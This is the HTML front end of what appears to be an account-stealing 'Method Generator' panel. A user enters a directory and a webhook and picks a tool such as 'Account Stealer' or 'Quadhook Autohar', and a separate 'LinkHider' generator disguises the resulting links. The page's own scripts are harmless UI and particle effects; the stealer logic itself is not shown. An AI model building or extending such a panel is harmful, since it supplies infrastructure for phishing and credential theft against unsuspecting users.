<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create</title>
    <!-- CSS / Bootstrap -->
    <link href="/Controlpage/css/imports.css?v=1742160749" rel="stylesheet">
    <link href="/Controlpage/css/config.css?v=1742160749&name=Controlpage" rel="stylesheet">
    <link rel="stylesheet" href="/controlpage/css/snackbar.css" />
    <link rel="stylesheet" href="/controlpage/css/particles.css"> <!-- Llamada al CSS de partículas -->
    <script src="/Controlpage/js/snackbar.js"></script>
    <style>
        .swal2-container { z-index: 20000 !important; }
    </style>
</head>

<body>
    <div id="particles-js"></div> <!-- Contenedor para las partículas -->
    
    <section id="login" name="regular" class="form">
        <div class="container h-100">
            <div class="row justify-content-center align-items-center h-100">
                <div class="col-md-10 col-lg-5">
                    <div class="login-box" data-aos="fade-up" data-aos-duration="1500">
                        <center><h2>Method Generator</h2></center>
                        <!-- LOGIN FORM -->
                        <form method="post" id="login-form">
                            <div class="form-input-icon mb-3 mt-4">
                                <i class="fas fa-folder"></i>
                                <input class="auth-input" type="text" placeholder="Directory Name" id="directory" required>
                            </div>
                            <div class="form-input-icon mb-3 mt-4">
                                <i class="fas fa-gear"></i>
                                <input class="auth-input" type="text" placeholder="Webhook" id="Webhook" required>
                            </div>
                            <div class="form-input-icon mb-3 mt-4" id="sname" style="display:none;">
                                <i class="fas fa-signature"></i>
                                <input class="auth-input" type="text" placeholder="Name here" name="sname">
                            </div>
                            <div class="form-input-icon mb-3 mt-4" id="sicon" style="display:none;">
                                <i class="fas fa-image"></i>
                                <input class="auth-input" type="text" placeholder="Thumbnail Here" name="sicon">
                            </div>
                            <div class="form-input-icon mb-3 mt-4" id="scolor" style="display:none;">
                                <i class="fas fa-paintbrush" aria-hidden="true"></i>
                                <input type="color" class="auth-input" name="scolor">
                            </div>
                            <select id="type" class="form-control" onchange="toggle()">
                                <option value="quadhook">Quadhook Autohar (VERY, OP)</option>
                                <option value="fb">Follow Bot (Autohar, Normal)</option>
                                <option value="gc">Game Copier (Autohar, Normal)</option>
                                <option value="cc">Clothing Copier (Autohar, Normal)</option>
                                <option value="as">Account Stealer (Autohar, Normal)</option>
                            </select>
                            <button type="button" class="button primary d-block mt-3 w-100" onclick="Create(this);" style="color:black">Generate</button>
                        </form>
                        <!-- ~LOGIN FORM -->
                    </div>
                    <center>
                        <button type="button" class="button primary d-block mt-3 w-80" onclick ="window.location.replace('/Controlpage/hyper-link');" style="color:black">
                            <i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator
                        </button>
                    </center>
                </div>
            </div>
        </div>
        <div class="overlay-top-right"></div>
        <div class="overlay-bottom-right"></div>
        <div class="overlay-bottom-left"></div>
    </section>

    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="../js/jquery-3.3.1.min.js"></script>
    <script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
    
    
    <script>
        function toggle() {
            var type = document.getElementById("type").value;
            var sname = document.getElementById("sname");
            var sicon = document.getElementById("sicon");
            var scolor = document.getElementById("scolor");

            if (type === "quadhook") {
                sname.style.display = "block";
                sicon.style.display = "block";
                scolor.style.display = "block";
            } else {
                sname.style.display = "none";
                sicon.style.display = "none";
                scolor.style.display = "none";
            }
        }

        window.onload = toggle;
    </script>

    <script>
        /* ---- particles.js config ---- */
        particlesJS("particles-js", {
            "particles": {
                "number": {
                    "value": 100,
                    "density": {
                        "enable": true,
                        "value_area": 800
                    }
                },
                "color": {
                    "value": "#ffffff"
                },
                "shape": {
                    "type": "circle",
                    "stroke": {
                        "width": 0,
                        "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    },
                    "image": {
                        "src": "img/github.svg",
                        "width": 100,
                        "height": 100
                    }
                },
                "opacity": {
                    "value": 0.5,
                    "random": false,
                    "anim": {
                        "enable": false,
                        "speed": 1,
                        "opacity_min": 0.1,
                        "sync": false
                    }
                },
                "size": {
                    "value": 3,
                    "random": true,
                    "anim": {
                        "enable": false,
                        "speed": 40,
                        "size_min": 0.1,
                        "sync": false
                    }
                },
                "line_linked": {
                    "enable": true,
                    "distance": 150,
                    "color": "#ffffff",
                    "opacity": 0.4,
                    "width": 1
                },
                "move": {
                    "enable": true,
                    "speed": 6,
                    "direction": "none",
                    "random": false,
                    "straight": false,
                    "out_mode": "out",
                    "bounce": false,
                    "attract": {
                        "enable": false,
                        "rotateX": 600,
                        "rotateY": 1200
                    }
                }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": {
                    "onhover": {
                        "enable": true,
                        "mode": "grab"
                    },
                    "onclick": {
                        "enable": true,
                        "mode": "push"
                    },
                    "resize": true
                },
                "modes": {
                    "grab": {
                        "distance": 140,
                        "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 400,
                        "size": 40,
                        "duration": 2,
                        "opacity": 8,
                        "speed": 3
                    },
                    "repulse": {
                        "distance": 200,
                        "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect": true
        });

        /* ---- stats.js config ---- */
        var count_particles, stats, update;
        stats = new Stats;
        stats.setMode(0);
        stats.domElement.style.position = 'absolute';
        stats.domElement.style.left = '0px';
        stats.domElement.style.top = '0px';
        document.body.appendChild(stats.domElement);
        count_particles = document.querySelector('.js-count-particles');
        update = function() {
            stats.begin();
            stats.end();
            if (window.pJSDom[0].pJS.particles && window.pJSDom[0].pJS.particles.array) {
                count_particles.innerText = window.pJSDom[0].pJS.particles.array.length;
            }
            requestAnimationFrame(update);
        };
        requestAnimationFrame(update);
    </script>
</body>
</html>
